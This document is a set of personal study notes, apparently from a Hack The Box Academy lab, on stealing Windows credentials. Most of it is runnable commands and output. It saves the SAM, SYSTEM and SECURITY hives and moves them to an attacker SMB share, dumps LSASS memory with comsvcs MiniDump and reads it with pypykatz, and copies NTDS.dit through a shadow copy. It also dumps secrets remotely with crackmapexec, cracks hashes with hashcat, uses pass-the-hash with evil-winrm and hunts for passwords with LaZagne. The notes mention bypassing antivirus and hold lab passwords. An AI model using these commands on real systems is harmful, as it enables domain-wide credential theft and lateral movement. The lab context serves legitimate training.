# Attacking SAM

-non-domain-joined-user
-dump sam database and transfer it to our attack box
-we crack it offline

#### Copying SAM Registry Hives
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes.

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
We can create backups of these hives using the `reg.exe` utility.

#### Using reg.exe save to Copy Registry Hives

Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives.
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

-Technically we will only need `hklm\sam` & `hklm\system`
-`hklm\security`  helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
-Once the hives are saved offline, we can use various methods to transfer them to our attack host.

#### Creating a Share with smbserver.py

Attacking SAM
```shell-session
AhmaDb0x@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.
#### Moving Hive Copies to Share
```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
```

## Dumping Hashes with Impacket's secretsdump.py
One incredibly useful tool we can use to dump the hashes offline is Impacket's `secretsdump.py`. Impacket can be found on most modern penetration testing distributions. We can check for it by using `locate` on a Linux-based system:
```bash
/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py
```
#### Running secretsdump.py

```shell-session
AhmaDb0x@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
#### Running Hashcat against NT Hashes
-save hashes in .txt files
```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```


## Remote Dumping & LSA Secrets Considerations

#### Dumping LSA Secrets Remotely
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.129.11.189 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely

```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```




# Attacking LSASS
LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows [security lo](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.:
## Dumping LSASS Process Memory
Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.

#### Task Manager Method

using RDP
-WE CREATE MEMORY DUMP 
-`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`
A file called `lsass.DMP` is created and saved in:
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
This is the file we will transfer to our attack host. We can use the file transfer method discussed in the `Attacking SAM` section of this module to transfer the dump file to our attack host.

#### Rundll32.exe & Comsvcs.dll Method
Task Manager method is dependent on us having a GUI-based interactive session with a target.
-dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).
-It is important to note that modern anti-virus tools recognize this method as malicious activity.
-we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

#### Finding LSASS PID in cmd
```cmd-session
C:\Windows\system32> tasklist /svc
```
#### Finding LSASS PID in PowerShell
```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\lsass.dmp full
```
modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing.

## Using Pypykatz to Extract Credentials

we have the dump file on our attack host
extract credentials from the .dmp file
Pypykatz is an implementation of Mimikatz written entirely in Python
run on Linux-based attack hosts
run Mimikatz directly on the target, which is not an ideal scenario

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.

LSASS is a subsystem of `local security authority`,

```shell-session
AhmaDb0x@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
#### MSV
```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```
MSV 
is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory
#### WDIGEST
`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`
`LSASS caches credentials used by WDIGEST in clear-text`. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text
-Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST

#### Kerberos

network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos

It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

#### DPAPI
```shell-session
= DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

The Data Protection Application Programming Interface
is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory.

`masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.`
#### Cracking the NT Hash with Hashcat
```shell-session
AhmaDb0x@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```




# Attacking Active Directory & NTDS.dit

a foothold established on the internal network to which the target is connected

there are situations where an organization may be using port forwarding to forward the remote desktop protocol (`3389`) or other protocols used for remote access on their [edge router] to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network.

Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`.


https://github.com/urbanadventurer/username-anarchy

That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do

## Dictionary Attacks against AD accounts using CrackMapExec
`noisy` (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of `group policy`

#### Creating a Custom list of Usernames
- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe
use an `automated list generator`
```bash
┌──(pwn㉿kali)-[~/username-anarchy-0.6]
└─$ ./username-anarchy         

```

```shell-session
AhmaDb0x@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
```

#### Launching the Attack with CrackMapExec
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
-account lockout ??
## Capturing NTDS.dit
/usr/share/wordlists/fasttrack.txt

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a forest
The `.dit` stands for [directory information tree]. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM` section.

#### Connecting to a DC with Evil-WinRM

```shell-session
AhmaDb0x@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
#### Checking Local Group Membership
what privileges `bwilliamson` has
```shell-session
*Evil-WinRM* PS C:\> net localgroup

*Administrators

```

`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

#### Checking User Account Privileges including Domain
```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
Domian admins 
```
#### Creating Shadow Copy of C:
 Volume Shadow Copy `VSS`:a feature in Windows that allows the system to create **snapshots** (or "shadow copies") of files and volumes even while they are in use. This is useful for **backup, recovery, and forensic analysis**.
 of the C: drive
 when initially installing AD. It is very likely that NTDS will be `stored on C`: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down.
 ```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
 #### Transferring NTDS.dit to Attack Host
 
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
#### A Faster Method: Using cme to Capture NTDS.dit
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
## Cracking Hashes & Gaining Credentials
```shell-session
AhmaDb0x@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

`What if we are unsuccessful in cracking a hash?`
## Pass-the-Hash Considerations
#### Pass-the-Hash with Evil-WinRM Example
```shell-session
AhmaDb0x@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.




# Credential Hunting in Windows


| Passwords     | Passphrases  | Keys        |
| ------------- | ------------ | ----------- |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |
## Search Tools
`Windows Search`
https://github.com/AlessandroZ/LaZagne
#### Running Lazagne All
```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all
```
```cmd-session

########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```
#### Using findstr
```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

`If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS`

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems,

Bob , HTB_@cademy_stdnt!

https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
10.129.151.24

curl -o LaZagne.exe http://10.10.14.167:80/LaZagne.exe
in: ubuntu
Password: FSadmin123


